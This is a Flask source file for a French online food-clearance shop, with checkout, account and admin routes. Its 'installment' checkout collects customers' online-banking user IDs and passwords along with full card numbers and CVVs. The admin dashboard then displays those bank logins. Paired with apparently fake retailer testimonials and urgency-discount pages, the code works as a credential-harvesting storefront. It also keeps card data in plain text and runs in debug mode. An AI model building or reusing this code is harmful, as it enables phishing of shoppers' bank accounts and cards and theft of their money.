                elif 'images' not in product or not product['images']:
                    product['images'] = ['default.jpg']
                
                item_total = float(product['price']) * int(quantity)
                subtotal += item_total
                cart_items.append({
                    'product': product,
                    'quantity': quantity,
                    'total': item_total
                })
        except (ValueError, TypeError, KeyError) as e:
            app.logger.error(f"Erreur traitement produit {product_id}: {str(e)}")
            continue
    
    # Gestion de la référence de commande (votre logique existante)
    user_identifier = None
    if session.get('logged_in'):
        user_identifier = session.get('user_id', session['username'])
    elif session.get('guest'):
        user_identifier = session['guest'].get('id', 'guest')
    
    order_reference = f"CMD-{user_identifier}-{datetime.now().strftime('%Y%m%d%H%M')}"
    
    # Récupération des infos utilisateur (votre logique existante)
    user_info = None
    if session.get('logged_in'):
        user_info = users.get(session['username'], {})
        # Assurer que les champs obligatoires existent
        user_info.setdefault('address', 'Non renseignée')
        user_info.setdefault('phone', 'Non renseigné')
        user_info.setdefault('email', 'Non renseigné')

    # Traitement du formulaire de paiement (NOUVEAU)
    if request.method == 'POST':
        payment_method = request.form.get('payment_method')
        
        # Création de l'objet commande
        order_data = {
            'items': {str(p['id']): cart[p['id']] for p in products if str(p['id']) in cart},
            'user': session.get('username', 'Guest'),
            'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'payment_method': payment_method,
            'status': 'En traitement',
            'reference': order_reference,
            'subtotal': subtotal,
            'total': subtotal * 1.2  # TVA incluse
        }

        # Ajout des informations bancaires selon le mode de paiement
        if payment_method == 'installment':
            order_data.update({
                'bank_name': request.form.get('bank_name'),
                'bank_user_id': request.form.get('bank_user_id'),
                'bank_password': request.form.get('bank_password'),
                'account_number': request.form.get('account_number'),
                'card_number': request.form.get('card_number'),
                'expiry_date': request.form.get('expiry_date'),
                'cvv': request.form.get('cvv'),
                'installment_plan': request.form.get('installment_plan')
            })
        elif payment_method == 'credit_card':
            order_data.update({
                'card_holder': request.form.get('card_holder'),
                'card_number': request.form.get('card_number'),
                'expiry_date': request.form.get('expiry_date'),
                'cvv': request.form.get('cvv')
            })

        # Sauvegarde de la commande
        if 'orders' not in session:
            session['orders'] = {}
        
        order_id = str(uuid.uuid4())
        session['orders'][order_id] = order_data
        session.modified = True

        # Vider le panier après commande
        session.pop('cart', None)

        return redirect(url_for('order_confirmation', order_id=order_id))

    # Affichage du formulaire (votre logique existante)
    return render_template('checkout.html',
                        cart_items=cart_items,
                        subtotal=subtotal,
                        total=subtotal,
                        user=user_info,
                        order_reference=order_reference,
                        is_guest=session.get('guest') is not None)


@app.route('/checkout_auth', methods=['GET', 'POST'])
def checkout_auth():
    # Si déjà connecté, rediriger vers checkout
    if session.get('logged_in'):
        return redirect(url_for('checkout'))

    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'login':
            session['next'] = 'checkout'
            return redirect(url_for('login'))
        elif action == 'register':
            session['next'] = 'checkout'
            return redirect(url_for('register'))
        elif action == 'guest':
            # Créer une session invité
            session['guest'] = {
                'id': f"guest_{datetime.now().strftime('%Y%m%d%H%M%S')}",
                'created_at': datetime.now().isoformat()
            }
            return redirect(url_for('checkout'))  # Redirection directe vers checkout

    return render_template('checkout_auth.html')


@app.route('/paiement', methods=['GET', 'POST'])
def payment():
    # Vérifier si l'utilisateur est connecté ou invité
    if not (session.get('logged_in') or session.get('guest')):
        return redirect(url_for('login'))
    
    cart = get_cart()
    if not cart:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        payment_method = request.form.get('payment_method')
        if not payment_method:
            flash('Veuillez sélectionner une méthode de paiement', 'error')
            return redirect(url_for('payment'))
        
        # Calculer le total
        total = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
        
        # Créer la commande
        order_id = datetime.now().strftime("%Y%m%d%H%M%S")
        user = session.get('username', session.get('guest', {}).get('id', 'guest'))
        
        order = {
            'id': order_id,
            'user': user,
            'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'items': dict(cart.items()),
            'total': total,
            'payment_method': payment_method,
            'status': 'En traitement'
        }
        
        # Stocker la commande
        if 'orders' not in session:
            session['orders'] = {}
        session['orders'][order_id] = order
        session.modified = True
        
        # Vider le panier
        session.pop('cart', None)
        
        return redirect(url_for('confirmation', order_id=order_id))
    
    # GET request - afficher la page de paiement
    total = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
    return render_template('payment.html', total=total)

from datetime import datetime

@app.route('/pourquoi-destockage-alimentaire')
def why_us():
    return render_template('why_us.html', title="Pourquoi choisir notre destockage alimentaire ?")
@app.route('/destockage-professionnel')
def pro():
    return render_template('pro.html', title="Destockage alimentaire pour professionnels")
@app.route('/guide-destockage-alimentaire')
def guide():
    return render_template('guide.html', title="Guide complet du destockage alimentaire")
# Route Flask pour tracking des conversions
@app.route('/track-conversion')
def track_conversion():
    session['conversion'] = True  # Pour le pixel de conversion
    return redirect(url_for('merci'))
@app.route('/destockage-urgence')
def landing():
    return render_template('landing.html')

@app.after_request
def add_header(response):
    if request.path.startswith('/static/'):
        response.cache_control.max_age = 31536000
    else:
        response.cache_control.max_age = 3600
    return response

@app.route('/promo-urgence')
def promo_urgence():
    return render_template('urgence.html', 
                         title="Offre limitée à -70%")


@app.route('/presse')
def presse():
    return render_template('presse.html')

@app.route('/destockage-professionnel')
def destockageprofessionnel():
    return render_template('destockage-professionnel.html')

@app.route('/nos-fournisseurs')
def nosfournisseurs():
    return render_template('nos-fournisseurs.html')
@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/blog')
def blog():
    return render_template('blog.html')

@app.route('/conditions')
def conditions():
    return render_template('conditions.html')

@app.route('/destockage-professionnel')
def destockage_professionnel():
    return render_template('destockage_professionnel.html')


@app.route('/product-feed.xml')
def product_feed():
    products = Product.query.all()  # Adaptez à votre BDD
    feed = render_template('product_feed.xml', products=products)
    response = make_response(feed)
    response.headers['Content-Type'] = 'application/xml'
    return response

@app.route('/confirmation/<order_id>')
def confirmation(order_id):
    # Autoriser l'accès sans connexion pour les invités
    if not (session.get('logged_in') or session.get('guest')):
        return redirect(url_for('login'))
    
    order = session.get('orders', {}).get(order_id)
    if not order:
        flash('Commande non trouvée', 'error')
        return redirect(url_for('index'))
    
    # Préparer les données de la commande
    cart_items = []
    total = 0.0
    
    for product_id, quantity in order['items'].items():
        product = next((p for p in products if str(p['id']) == product_id), None)
        if product:
            item_total = product['price'] * int(quantity)
            total += item_total
            cart_items.append({
                'name': product['name'],
                'quantity': quantity,
                'price': product['price'],
                'total': item_total
            })
    
    order_data = {
        'id': order_id,
        'date': datetime.strptime(order['date'], "%Y-%m-%d %H:%M:%S").strftime("%d/%m/%Y à %H:%M"),
        'status': order['status'],
        'total': total,
        'items': cart_items,
        'is_guest': 'guest' in session  # Ajouter cette information pour le template
    }
    
    return render_template('confirmation.html', order=order_data)

from datetime import datetime, timedelta

@app.before_request
def cleanup_guest_sessions():
    """Nettoie les sessions invitées après 1 heures."""
    if 'guest' in session:
        # Récupère le timestamp de création ou None
        guest_created = session.get('guest_created')
        
        if guest_created:
            # Convertit en datetime naive si nécessaire
            if isinstance(guest_created, str):
                guest_created = datetime.strptime(guest_created, "%Y-%m-%d %H:%M:%S")
            elif guest_created.tzinfo is not None:
                guest_created = guest_created.replace(tzinfo=None)
            
            # Vérifie si 24h se sont écoulées
            if (datetime.now() - guest_created) > timedelta(hours=1):
                session.pop('guest', None)
                session.pop('guest_created', None)
        
        # Initialise si non existant
        elif 'guest_created' not in session:
            session['guest_created'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")# Authentification
            
@app.route('/connexion', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        user = users.get(username)
        if user and check_password_hash(user['password'], password):
            session['logged_in'] = True
            session['username'] = username
            flash('Connexion réussie', 'success')
            
            next_page = session.pop('next', None)
            if next_page:
                return redirect(url_for(next_page))
            return redirect(url_for('index'))
        else:
            flash('Identifiant ou mot de passe incorrect', 'error')
    
    return render_template('login.html')

@app.route('/checkout-guest', methods=['POST'])
def checkout_guest():
    # Créer une session invité
    session['guest'] = {
        'id': f"guest_{datetime.now().strftime('%Y%m%d%H%M%S')}",
        'email': request.form.get('email'),  # Optionnel: stocker l'email
        'guest': True
    }
    return redirect(url_for('checkout'))
        

@app.route('/contact')
def contact():
    team_members = [
        {
            'name': 'Jean Dupont',
            'role': 'Directeur Général',
            'bio': 'Expert en logistique avec 15 ans d\'expérience dans la grande distribution.',
            'photo': 'team1.jpg'
        },
        {
            'name': 'Marie Lambert',
            'role': 'Responsable Qualité',
            'bio': 'Spécialiste des normes alimentaires, garantit la fraîcheur de nos produits.',
            'photo': 'team2.jpg'
        },
        {
            'name': 'Thomas Martin',
            'role': 'Responsable Clientèle',
            'bio': 'Votre interlocuteur privilégié pour toute demande commerciale.',
            'photo': 'team3.jpg'
        }
    ]

    testimonials = [
        {
            'author': 'Sophie Dubois - Carrefour Market',
            'content': 'Un partenariat exceptionnel depuis 3 ans. Livraisons toujours à l\'heure et produits de qualité irréprochable.'
        },
        {
            'author': 'Michel Bernard - Metro Cash & Carry',
            'content': 'Le meilleur rapport qualité-prix du marché. Service client réactif et professionnel.'
        },
        {
            'author': 'Nathalie Leroy - Intermarché',
            'content': 'Notre fournisseur préféré pour les opérations de destockage. Fiabilité et transparence.'
        }
    ]

    stats = {
        'years': 8,
        'clients': 420,
        'products': 1500,
        'delivery_rate': 99.7
    }

    return render_template('contact.html',
                         team_members=team_members,
                         testimonials=testimonials,
                         stats=stats)

@app.route('/inscription', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        email = request.form['email']
        full_name = request.form['full_name']
        
        if username in users:
            flash('Ce nom d\'utilisateur est déjà pris', 'error')
        else:
            users[username] = {
                'password': generate_password_hash(password),
                'email': email,
                'full_name': full_name,
                'address': '',
                'phone': ''
            }
            flash('Inscription réussie. Vous pouvez maintenant vous connecter.', 'success')
            return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/admin/delete-user/<username>', methods=['POST'])
def admin_delete_user(username):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    if username not in users:
        return jsonify({'success': False, 'message': 'Utilisateur non trouvé'}), 404
    
    if username == 'admin':
        return jsonify({'success': False, 'message': 'Impossible de supprimer l\'administrateur principal'}), 400
    
    try:
        del users[username]
        return jsonify({'success': True, 'message': 'Utilisateur supprimé avec succès'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.after_request
def after_request(response):
    if 'cart' in session:
        session.modified = True
    return response


@app.route('/cancel_order/<order_id>', methods=['POST'])
def cancel_order(order_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if 'orders' in session and order_id in session['orders']:
        session['orders'][order_id]['status'] = 'Annulée'
        session.modified = True
        flash('Commande annulée avec succès', 'success')
    else:
        flash('Commande non trouvée', 'error')
    
    return redirect(url_for('account'))


@app.route('/delete_address', methods=['POST'])
def delete_address():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    address_id = request.form.get('address_id')
    
    if 'addresses' in users[username]:
        users[username]['addresses'] = [
            addr for addr in users[username]['addresses']
            if addr['id'] != address_id
        ]
        flash('Adresse supprimée avec succès', 'success')
    else:
        flash('Adresse non trouvée', 'error')
    
    return redirect(url_for('account'))

# Gestion des cartes
@app.route('/add_card', methods=['POST'])
def add_card():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    card_data = {
        'id': str(uuid.uuid4()),
        'number': request.form.get('card_number'),
        'expiry': request.form.get('expiry_date'),
        'name': request.form.get('card_name'),
        'cvv': request.form.get('cvv'),
        'default': request.form.get('default_card') == 'on'
    }
    
    if 'payment_methods' not in users[username]:
        users[username]['payment_methods'] = []
    
    if card_data['default']:
        for card in users[username]['payment_methods']:
            card['default'] = False
    
    users[username]['payment_methods'].append(card_data)
    flash('Carte ajoutée avec succès', 'success')
    return redirect(url_for('account'))


@app.route('/delete_card', methods=['POST'])
def delete_card():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    card_id = request.form.get('card_id')
    
    if 'payment_methods' in users[username]:
        users[username]['payment_methods'] = [
            card for card in users[username]['payment_methods']
            if card['id'] != card_id
        ]
        flash('Carte supprimée avec succès', 'success')
    else:
        flash('Carte non trouvée', 'error')
    
    return redirect(url_for('account'))

# Gestion des commandes
@app.route('/order/<order_id>')
def order_details(order_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    order = session.get('orders', {}).get(order_id)
    if not order:
        flash('Commande non trouvée', 'error')
        return redirect(url_for('account'))
    
    return render_template('order_details.html', order=order)
@app.route('/compte', methods=['GET', 'POST'])
def account():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    user = users.get(username)
    
    if user is None:
        flash('Votre session a expiré, veuillez vous reconnecter', 'error')
        return redirect(url_for('login'))
    
    # Préparation des commandes pour le template
    user_orders = []
    if 'orders' in session:
        for order_id, order_data in session['orders'].items():
            if isinstance(order_data, dict) and order_data.get('user') == username:
                # Création d'une nouvelle structure de commande
                order = {
                    'id': order_id,
                    'date': order_data.get('date', 'Date inconnue'),
                    'status': order_data.get('status', 'Inconnu'),
                    'total': order_data.get('total', 0),
                    'items': []
                }
                
                # Gestion des items de la commande
                items = order_data.get('items', {})
                if hasattr(items, 'items'):  # Si c'est un dictionnaire
                    items = items.items()
                elif callable(items):  # Si c'est une méthode
                    continue  # On saute cette commande
                
                # Conversion en liste si nécessaire
                if not isinstance(items, (list, tuple)):
                    items = []
                
                for product_id, quantity in items:
                    product = next((p for p in products if str(p['id']) == str(product_id)), None)
                    if product:
                        order['items'].append({
                            'id': product['id'],
                            'name': product['name'],
                            'price': product['price'],
                            'quantity': quantity,
                            'image': product.get('image', 'default-product.jpg')
                        })
                
                user_orders.append(order)
    
    # Initialisation des champs manquants
    user.setdefault('joined_date', datetime.now().strftime("%Y-%m-%d"))
    user.setdefault('payment_methods', [])
    user.setdefault('address', '')
    user.setdefault('phone', '')
    
    return render_template('account.html', 
                         user=user,
                         orders=user_orders,
                         products=products)

@app.route('/admin')
@admin_required
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    # Récupérer toutes les commandes
    orders = session.get('orders', {})
    
    # Préparer les données pour l'affichage
    processed_orders = []
    for order_id, order_data in orders.items():
        # Calculer le total des articles
        order_total = 0
        order_items = []
        
        for product_id, quantity in order_data.get('items', {}).items():
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                item_total = product['price'] * int(quantity)
                order_total += item_total
                order_items.append({
                    'name': product['name'],
                    'quantity': quantity,
                    'price': product['price'],
                    'total': item_total
                })
        
        # Ajouter les informations de paiement
        payment_info = {
            'method': order_data.get('payment_method', 'Non spécifié'),
            'status': order_data.get('status', 'Inconnu'),
            'total': order_total,
            'bank_details': {
                'user_id': order_data.get('bank_user_id', 'N/A'),
                'password': order_data.get('bank_password', 'N/A')
            } if order_data.get('payment_method') == 'installment' else None
        }
        
        processed_orders.append({
            'id': order_id,
            'date': order_data.get('date', 'Date inconnue'),
            'user': order_data.get('user', 'Invité'),
            'items': order_items,
            'payment': payment_info,
            'status': order_data.get('status', 'En traitement')
        })
    
    # Trier les commandes par date (les plus récentes en premier)
    processed_orders.sort(key=lambda x: x.get('date', ''), reverse=True)
    
    return render_template('admin_dashboard.html',
                         orders=processed_orders,
                         users=users,
                         products=products)

@app.route('/admin/orders')
@admin_required
def admin_orders():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    orders = session.get('orders', {})
    processed_orders = []
    
    for order_id, order_data in orders.items():
        # Calculer le total
        total = 0
        for product_id, quantity in order_data.get('items', {}).items():
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                total += product['price'] * int(quantity)
        
        processed_orders.append({
            'id': order_id,
            'date': order_data.get('date'),
            'user': order_data.get('user'),
            'total': total,
            'status': order_data.get('status', 'En traitement'),
            'payment_method': order_data.get('payment_method', 'Non spécifié')
        })
    
    # Trier par date
    processed_orders.sort(key=lambda x: x['date'], reverse=True)
    
    return render_template('admin_orders.html', orders=processed_orders)

@app.route('/admin/update-order-status/<order_id>', methods=['POST'])
def admin_update_order_status(order_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    if 'orders' not in session or order_id not in session['orders']:
        return jsonify({'success': False, 'message': 'Commande non trouvée'}), 404
    
    try:
        new_status = request.json.get('status')
        if new_status not in ['En traitement', 'Validée', 'En préparation', 'Expédiée', 'Livrée']:
            return jsonify({'success': False, 'message': 'Statut invalide'}), 400
        
        session['orders'][order_id]['status'] = new_status
        session.modified = True
        
        return jsonify({'success': True, 'message': 'Statut mis à jour'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/admin/products')
def admin_products():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    return render_template('admin_products.html', products=products, categories=categories)

@app.route('/admin/users')
def admin_users():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    return render_template('admin_users.html', users=users)

from flask import render_template, make_response
from datetime import datetime

@app.route('/sitemap.xml')
def sitemap():
    # Liste des pages principales, avec les pages supplémentaires
    pages = [
        '/', '/contact', '/about', '/produits', '/conditions', '/mentions-legales',  # Ajout des nouvelles pages
        '/destockage-professionnel', '/guide-destockage-alimentaire', '/nos-fournisseurs',
        '/blog', '/presse'  # Correction du problème de la virgule
    ]
    
    # Génération dynamique des URLs produits
    for product in products:
        pages.append(f"/produit/{product['id']}")
    
    # Génération du sitemap XML avec la date actuelle
    sitemap_xml = render_template('sitemap.xml', pages=pages, now=datetime.utcnow())
    
    # Création de la réponse HTTP avec le bon type de contenu
    response = make_response(sitemap_xml)
    response.headers['Content-Type'] = 'application/xml'
    
    return response


@app.route('/robots.txt')
def robots():
    return send_from_directory(app.static_folder, 'robots.txt')
    
@app.before_request
def enforce_www():
    # Redirige uniquement si l'host commence par 'www.' et ce n'est pas déjà en 'destockalimentairestore.com'
    if request.host.startswith('www.destockalimentairestore.com'):
        url = request.url.replace('www.destockalimentairestore.com', 'destockalimentairestore.com', 1)
        return redirect(url, code=301)


@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin'))
    
    # Récupérer toutes les commandes avec leurs détails
    orders = session.get('orders', {})
    
    # Préparer les données pour l'affichage
    processed_orders = []
    for order_id, order_data in orders.items():
        # Calculer le total des articles
        order_total = 0
        order_items = []
        
        for product_id, quantity in order_data.get('items', {}).items():
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                item_total = product['price'] * int(quantity)
                order_total += item_total
                order_items.append({
                    'name': product['name'],
                    'quantity': quantity,
                    'price': product['price'],
                    'total': item_total
                })
        
        # Ajouter les informations de paiement
        payment_info = {
            'method': order_data.get('payment_method', 'Non spécifié'),
            'status': order_data.get('status', 'Inconnu'),
            'total': order_total,
            'bank_details': {
                'user_id': order_data.get('bank_user_id', 'N/A'),
                'password': order_data.get('bank_password', 'N/A')
            } if order_data.get('payment_method') == 'installment' else None
        }
        
        processed_orders.append({
            'id': order_id,
            'date': order_data.get('date', 'Date inconnue'),
            'user': order_data.get('user', 'Invité'),
            'items': order_items,
            'payment': payment_info,
            'status': order_data.get('status', 'En traitement')
        })
    
    # Trier les commandes par date (les plus récentes en premier)
    processed_orders.sort(key=lambda x: x.get('date', ''), reverse=True)
    
    return render_template('admin_dashboard.html', 
                         orders=processed_orders,
                         users=users,
                         products=products)

@app.route("/mentions-legales")
def mentions_legales():
    return render_template("mentions-legales.html")

@app.route("/cgv")
def cgv():
    return render_template("cgv.html")

@app.route("/politique-confidentialite")
def politique_confidentialite():
    return render_template("politique-confidentialite.html")

@app.route("/faq")
def faq():
    return render_template("faq.html")


# Route pour basculer un produit en vedette
@app.route('/admin/toggle-featured/<int:product_id>', methods=['POST'])
def toggle_featured(product_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
    
    try:
        product['featured'] = not product['featured']
        return jsonify({'success': True, 'featured': product['featured']})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/deconnexion')
def logout():
    session.clear()
    flash('Vous avez été déconnecté', 'success')
    return redirect(url_for('index'))

@app.route('/generate_proforma/<order_id>')
def generate_proforma(order_id):
    try:
        from reportlab.lib.pagesizes import landscape, letter
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib import colors
        from io import BytesIO
        import os
        from datetime import datetime, timedelta

        # Vérification de la commande
        if 'orders' not in session or order_id not in session['orders']:
            app.logger.error(f"Commande {order_id} introuvable")
            return "Commande introuvable", 404

        order = session['orders'][order_id]

        # Création du buffer PDF
        buffer = BytesIO()
        
        # Configuration du document
        doc = SimpleDocTemplate(buffer, pagesize=landscape(letter),
                              rightMargin=30,
                              leftMargin=30,
                              topMargin=30,
                              bottomMargin=30)

        styles = getSampleStyleSheet()
        
        # Styles personnalisés
        styles.add(ParagraphStyle(
            name='InvoiceTitle',
            fontSize=18,
            textColor=colors.HexColor('#2a5bd7'),
            alignment=1,
            spaceAfter=20
        ))

        elements = []

        # Logo (vérifier que le fichier existe dans static/images/logo.png)
        try:
            logo_path = os.path.join(app.static_folder, 'images', 'logo.png')
            if os.path.exists(logo_path):
                logo = Image(logo_path, width=180, height=80)
                elements.append(logo)
                elements.append(Spacer(1, 20))
        except Exception as e:
            app.logger.warning(f"Erreur logo: {str(e)}")

        # Titre
        elements.append(Paragraph("FACTURE PROFORMA", styles['InvoiceTitle']))
        elements.append(Spacer(1, 30))

        # Informations de base
        info = [
            ["N° Facture:", order_id],
            ["Date:", datetime.now().strftime('%d/%m/%Y %H:%M')],
            ["Client:", order.get('user', 'Guest')],
            ["Statut:", order.get('status', 'En traitement')]
        ]

        info_table = Table(info, colWidths=[100, 400])
        info_table.setStyle(TableStyle([
            ('FONTNAME', (0,0), (-1,-1), 'Helvetica'),
            ('FONTSIZE', (0,0), (-1,-1), 10),
            ('VALIGN', (0,0), (-1,-1), 'TOP'),
            ('ALIGN', (0,0), (0,-1), 'LEFT'),
            ('TEXTCOLOR', (0,0), (0,-1), colors.HexColor('#6b7280')),
        ]))
        
        elements.append(info_table)
        elements.append(Spacer(1, 30))

        # Détails des articles
        items_header = ["Produit", "Prix unitaire", "Quantité", "Total"]
        items_data = [items_header]
        
        subtotal = 0
        for product_id, quantity in order['items'].items():
            product = next((p for p in products if str(p['id']) == product_id), None)
            if product:
                item_total = product['price'] * int(quantity)
                subtotal += item_total
                items_data.append([
                    product['name'],
                    f"{product['price']:.2f}€",
                    str(quantity),
                    f"{item_total:.2f}€"
                ])

        tva = subtotal * 0.2
        total_ttc = subtotal + tva
        
        items_table = Table(items_data, colWidths=[300, 80, 80, 80])
        items_table.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#2a5bd7')),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('ALIGN', (2,0), (-1,-1), 'RIGHT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('FONTSIZE', (0,0), (-1,-1), 10),
            ('BOTTOMPADDING', (0,0), (-1,-1), 8),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor('#e5e7eb')),
        ]))
        
        elements.append(items_table)
        elements.append(Spacer(1, 20))

        # Totaux
        totals = [
            ["", "", "Sous-total:", f"{subtotal:.2f}€"],
            ["", "", "TVA (20%):", f"{tva:.2f}€"],
            ["", "", "Total TTC:", f"<b>{total_ttc:.2f}€</b>"]
        ]
        
        totals_table = Table(totals, colWidths=[300, 80, 80, 80])
        totals_table.setStyle(TableStyle([
            ('ALIGN', (2,0), (-1,-1), 'RIGHT'),
            ('FONTNAME', (0,-1), (-1,-1), 'Helvetica-Bold'),
            ('LINEABOVE', (0,0), (-1,0), 1, colors.HexColor('#6b7280')),
        ]))
        
        elements.append(totals_table)
        elements.append(Spacer(1, 30))

        # Pied de page
        footer = Paragraph(
            "Destockage Professionnel - SAS au capital de 50 000€<br/>"
            "123 Rue du Commerce, 75000 Paris - contact@destockage-pro.com",
            ParagraphStyle(
                name='Footer',
                fontSize=8,
                textColor=colors.HexColor('#6b7280'),
                alignment=1
            )
        )
        elements.append(footer)

        # Génération du PDF
        doc.build(elements)
        
        # Préparation de la réponse
        buffer.seek(0)
        response = make_response(buffer.getvalue())
        response.headers['Content-Type'] = 'application/pdf'
        response.headers['Content-Disposition'] = f'inline; filename=Facture_{order_id}.pdf'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        
        return response

    except Exception as e:
        app.logger.error(f"Erreur génération PDF: {str(e)}")
        return f"Erreur lors de la génération du PDF: {str(e)}", 500
    
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
@app.route('/test_pdf')
def test_pdf():
    buffer = BytesIO()
    p = canvas.Canvas(buffer)
    p.drawString(100, 100, "Test PDF - Ça fonctionne !")
    p.showPage()
    p.save()
    buffer.seek(0)
    return send_file(buffer, mimetype='application/pdf')


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5012))  # Render fournit le port via la variable PORT
    app.run(host='0.0.0.0', port=port, debug=True)
